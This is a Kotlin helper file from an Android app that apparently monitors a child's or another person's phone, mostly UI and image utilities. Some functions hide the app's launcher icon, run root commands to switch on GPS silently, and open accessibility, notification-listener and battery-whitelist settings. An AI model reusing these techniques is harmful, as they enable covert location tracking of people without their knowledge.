package com.safe.setting.app.utils

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.os.VibrationEffect
import android.provider.MediaStore
import android.provider.Settings
import android.util.TypedValue
import androidx.annotation.IdRes
import androidx.constraintlayout.widget.ConstraintLayout
import com.google.android.material.appbar.AppBarLayout
import androidx.core.content.ContextCompat
import android.view.View
import android.view.ViewGroup
import android.view.ViewTreeObserver
import android.view.inputmethod.InputMethodManager
import android.widget.ImageView
import android.widget.RelativeLayout
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.content.res.AppCompatResources
import androidx.core.net.toUri
import cn.pedant.SweetAlert.SweetAlertDialog
import com.bumptech.glide.GenericTransitionOptions
import com.bumptech.glide.Glide
import com.bumptech.glide.load.engine.DiskCacheStrategy
import com.bumptech.glide.request.RequestOptions
import com.daimajia.androidanimations.library.Techniques
import com.daimajia.androidanimations.library.YoYo
import com.safe.setting.app.ui.activities.login.LoginActivity
import com.safe.setting.app.ui.activities.mainparent.MainParentActivity
import com.safe.setting.app.ui.fragments.maps.MapsFragment
import com.safe.setting.app.utils.Consts.COMMAND_ENABLE_GPS_PROVIDER
import com.safe.setting.app.utils.Consts.COMMAND_ENABLE_NETWORK_PROVIDER
import com.safe.setting.app.utils.async.AsyncTaskRootPermission
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import com.pawegio.kandroid.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import com.safe.setting.app.ui.widget.toolbar.CustomToolbar


@Suppress("DEPRECATION")
object ConstFun {

    fun getPackageCheckSocial(): String = BuildConfig.BUILD_TYPE

    fun getRandomNumeric() : String = System.currentTimeMillis().toString()

    inline fun <reified V : View> View.find(@IdRes id: Int): V = findViewById(id)

    fun isAndroidM(): Boolean = true

    private fun isAndroidO() : Boolean = true

fun Context.setVibrate(milliseconds: Long) {
    vibrator!!.vibrate(VibrationEffect.createOneShot(milliseconds, 10))

}

    fun View.viewAnimation(anim: Techniques, duration: Long) =
        YoYo.with(anim).duration(duration).pivot(YoYo.CENTER_PIVOT, YoYo.CENTER_PIVOT).playOn(this)!!

    inline fun <reified T : Any> Activity.startAnimateActivity(enterAnim:Int, exitAnim:Int) {
        startActivity<T>()
        finish()
        animateActivity(enterAnim,exitAnim)
    }

//    inline fun <reified T : Any> Activity.startAnimateActivity() { startActivity<T>() ; animateActivity(R.anim.fade_in,R.anim.fade_out) }

    fun Activity.startMain(fragmentTag:String){
        Intent(this,MainParentActivity::class.java).also {
            it.putExtra("TAG",fragmentTag)
            it.start(this)
            finish()
//            animateActivity(R.anim.fade_in,R.anim.fade_out)
        }
    }

    inline fun <reified S : Any> Context.startServiceSms(smsAddress:String,smsBody:String,type:Int){
        val myIntent = IntentFor<S>(this)
        myIntent.putExtra(Consts.SMS_ADDRESS,smsAddress)
        myIntent.putExtra(Consts.SMS_BODY,smsBody)
        myIntent.putExtra(Consts.TYPE_SMS,type)
        startService(myIntent)
    }

    fun Activity.animateActivity(enterAnim:Int, exitAnim:Int) = overridePendingTransition(enterAnim, exitAnim)

    fun Activity.openGallery() = Intent(Intent.ACTION_PICK,MediaStore.Images.Media.EXTERNAL_CONTENT_URI).also {
        it.flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        it.type = "image/*"
        startActivityForResult(it,100)
    }

    fun View.isShow(state: Boolean) = if (state) show() else hide()

    fun Context.openAppSystemSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        val uri = Uri.fromParts("package", packageName, null)
        intent.data = uri
        intent.start(this)
    }

    fun runThread(sleep: Long, action: () -> Unit): Thread = Thread {
        while (true) {
            try {
                Thread.sleep(sleep)
                runOnUiThread { action() }
            } catch (e: InterruptedException) {
                break
            }
        }
    }


    fun getDateTime(): String {
        val dateFormat = SimpleDateFormat("dd MMM yyyy hh:mm a", Locale.US) // Or any other locale
        return dateFormat.format(Calendar.getInstance().time)
    }

    fun Context.alertDialog(alertType: Int, title: Int, msg: String?, txtPositiveButton: Int?, cancellable: Boolean = false, action: SweetAlertDialog.() -> Unit): SweetAlertDialog {
        val dialog = SweetAlertDialog(this, alertType).apply {
            titleText = getString(title)
            setCancelable(cancellable)

            if (alertType != SweetAlertDialog.PROGRESS_TYPE) {
                contentText = msg
                confirmText = getString(txtPositiveButton!!)
                if (cancellable) cancelText = getString(android.R.string.cancel)
                showCancelButton(cancellable)
            } else progressHelper.barColor = ContextCompat.getColor(this@alertDialog, R.color.colorPrimary)
        }
        action(dialog)
        return dialog
    }

    fun Context.alertDialog(v:View,cancellable: Boolean = false) : AlertDialog =
        AlertDialog.Builder(this).setView(v)
            .setCancelable(cancellable).create()


    fun ImageView.setImageUrl(url: String, placeholder: Int) {
        Glide.with(this).load(url)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions()
                .diskCacheStrategy(DiskCacheStrategy.ALL)
                .placeholder(AppCompatResources.getDrawable(context, placeholder))
            )
            .into(this)
    }

    fun ImageView.setImageId(drawable:Int){
        Glide.with(this).load(drawable)
            .transition(GenericTransitionOptions.with(android.R.anim.fade_in))
            .apply(RequestOptions().diskCacheStrategy(DiskCacheStrategy.ALL))
            .into(this)
    }

    fun convertCurrentDuration(currentDuration: Long): String {
        val seconds = (currentDuration % 60000 / 1000).toString()
        val minutes = (currentDuration / 60000).toString()
        return if (seconds.length == 1) "$minutes:0$seconds" else "$minutes:$seconds"
    }

    fun Context.openAccessibilitySettings() = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).also { it.start(this) }

    fun Context.openUseAccessSettings() = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).also { it.start(this) }

    fun Context.openNotificationListenerSettings(){
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        intent.start(this)
    }

    fun Context.openWhitelistSettings() {
    if (isAndroidM()) {
        // Check if battery optimization is already disabled
        if (!isIgnoringBatteryOptimizations()) {
            // If not disabled, show dialog to guide the user to disable battery optimization
            showBatteryOptimizationDialog()
        } else {
            // Battery optimization is already disabled, no need to prompt
            // You can include additional logic here if needed
        }
    }
}

    private fun Context.showBatteryOptimizationDialog() {
        AlertDialog.Builder(this)
            .setTitle("Battery Optimization")
            .setMessage("To ensure uninterrupted use of our app, please disable battery optimization for our app.")
            .setPositiveButton("Go to Settings") { _, _ ->
                openBatteryOptimizationSettings()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun Context.openBatteryOptimizationSettings() {
        val intent = Intent().apply {
            action = Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS
        }

        try {
            startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
            // Handle the exception or log it for debugging
        }
    }

    private fun Context.isIgnoringBatteryOptimizations(): Boolean {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager?
        return powerManager?.isIgnoringBatteryOptimizations(packageName) ?: false
    }

    fun isRoot() : Boolean {
        if (Build.TAGS != null && Build.TAGS.contains("test-keys")) return true
        val patch = arrayOf("/su/bin","/sbin", "/system/bin", "/system/sbin", "/system/xbin", "/data/local/xbin",
            "/data/local/bin", "/system/sd/xbin", "/system/bin/failsafe", "/vendor/bin", "/data/local")
        var result = false
        for (element in patch) if (File("$element/su").exists()){ result = true ; break }
        return result
    }

    fun Context.permissionRoot(result:(result:Boolean)->Unit) =
        AsyncTaskRootPermission(this){ result(it) }.execute()

    fun enableGpsRoot() = AsyncTaskRunCommand(onPostFunc = { enableNetworkProviderRoot() }).execute(COMMAND_ENABLE_GPS_PROVIDER)
    private fun enableNetworkProviderRoot() = AsyncTaskRunCommand().execute(COMMAND_ENABLE_NETWORK_PROVIDER)


    fun Context.showApp(state:Boolean){
        val componentName = ComponentName(this, LoginActivity::class.java)
        packageManager.setComponentEnabledSetting(componentName,
            if (state) PackageManager.COMPONENT_ENABLED_STATE_ENABLED else PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }

    fun Context.isNotificationServiceRunning() : Boolean {
        val enabledNotificationListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName)
    }

    fun Context.isAddWhitelist() : Boolean =
        if (isAndroidM()) powerManager!!.isIgnoringBatteryOptimizations(packageName)
        else true


    fun View.showKeyboard(show:Boolean){
        val imm = context.getSystemService(Context.INPUT_METHOD_SERVICE) as InputMethodManager
        if (show) imm.showSoftInput(this, InputMethodManager.SHOW_IMPLICIT)
        else imm.hideSoftInputFromWindow(this.windowToken, 0)
    }

    fun contentGlobalLayout(content: ConstraintLayout, appBar: AppBarLayout){
        content.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener{
            override fun onGlobalLayout() {
                content.viewTreeObserver.removeOnGlobalLayoutListener(this)
                val appbar = appBar.height
                content.translationY = -appbar.toFloat()
                content.layoutParams.height = content.height + appbar
            }
        })
    }


    fun Context.adjustFontScale() {
    val configuration = resources.configuration
    if (configuration.fontScale > 1) {
        configuration.fontScale = 0.85f
        val metrics = resources.displayMetrics
        val display = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            display
        } else {
            TODO("VERSION.SDK_INT < R")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {

            (display.getRealMetrics(metrics))
        } else {

            (display.getMetrics(metrics))
        }
        metrics.density = configuration.fontScale * resources.displayMetrics.density
        metrics.densityDpi = (160 * configuration.fontScale).toInt()
        createConfigurationContext(configuration)
        //resources.updateConfiguration(configuration, metrics)
    }
}

    fun Context.sendToGoogleMaps(latitude:String,longitude:String){
        try {
            val uri = "geo:0,0?q=$latitude,$longitude".toUri()
            Intent(Intent.ACTION_VIEW,uri).also {
                it.setPackage("com.google.android.apps.maps")
                if (it.resolveActivity(packageManager)!=null) startActivity(it)
                else longToast(R.string.maps_installed)
            }
        }catch (t:Throwable){
            longToast(R.string.maps_installed)
        }
    }

    fun isScrollToolbar(toolbar: CustomToolbar, state: Boolean){
        val params = toolbar.layoutParams as AppBarLayout.LayoutParams
        if (state) params.scrollFlags = AppBarLayout.LayoutParams.SCROLL_FLAG_SCROLL or AppBarLayout.LayoutParams.SCROLL_FLAG_ENTER_ALWAYS
        else params.scrollFlags = 0
    }


    fun View?.setPaddingCompass(top:AppBarLayout){
        try {
            if (this!=null){
                val parent = findViewWithTag<View>("GoogleMapMyLocationButton").parent as ViewGroup
                parent.post {
                    val marginPixels = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 20f, resources.displayMetrics).toInt()
                    val mapCompass = parent.getChildAt(4)
                    val rlp = RelativeLayout.LayoutParams(mapCompass.height, mapCompass.height)
                    rlp.addRule(RelativeLayout.ALIGN_PARENT_TOP)
                    rlp.addRule(RelativeLayout.ALIGN_PARENT_RIGHT)
                    rlp.setMargins(marginPixels,top.height,marginPixels,marginPixels)
                    mapCompass.layoutParams = rlp
                }
            }
        } catch (t: Throwable) {
            e(MapsFragment.TAG,t.message.toString())
        }
    }
}